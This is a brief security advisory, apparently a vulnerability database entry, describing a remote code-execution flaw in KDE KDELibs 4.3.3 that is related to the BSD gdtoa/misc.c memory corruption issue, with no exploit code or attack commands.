KDE is prone to a remote code-execution vulnerability that affects KDELibs.

Successful exploits may allow an attacker to execute arbitrary code. Failed attacks may cause denial-of-service conditions.

NOTE: This issue is related to BID 35510 (Multiple BSD Distributions 'gdtoa/misc.c' Memory Corruption Vulnerability), but because of differences in the code base, it is being assigned its own record.

This issue affects KDE KDELibs 4.3.3; other versions may also be affected.
